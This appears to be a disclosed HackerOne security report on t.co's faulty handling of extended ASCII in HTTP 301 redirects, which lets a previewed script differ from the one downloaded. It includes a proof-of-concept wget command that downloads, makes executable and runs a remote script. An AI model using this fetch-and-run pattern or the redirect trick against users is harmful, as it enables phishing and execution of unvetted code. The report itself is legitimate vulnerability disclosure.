---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '34084'
original_report_id: '34084'
title: Bad extended ascii handling in HTTP 301 redirects of t.co
weakness: Open Redirect
team_handle: x
created_at: '2014-11-05T23:38:17.735Z'
disclosed_at: '2015-08-09T16:10:51.215Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- open-redirect
---

# Bad extended ascii handling in HTTP 301 redirects of t.co

## Metadata

- HackerOne Report ID: 34084
- Weakness: Open Redirect
- Program: x
- Disclosed At: 2015-08-09T16:10:51.215Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This proof of concept is conceived and tested on Linux+bash (because I'm an user), and of course is harmless.

Imagine a tweet or a line in a tutorial that look like this : 
`wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh`
Of course, you'll test the link in a browser to see if the script downloaded is harmless. It's the case. So you copy/paste the whole command in bash and execute it. And here is the issue, because the script previewed and the one downloaded are different.

All the details of the issue are in the script downloaded. I think the correction is easy enough (change the padding of the extended ascii char), but the possibilities of phishing with this bug are big.

Anyway, I'm available if you have any question, @Cqoicebordel or here.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
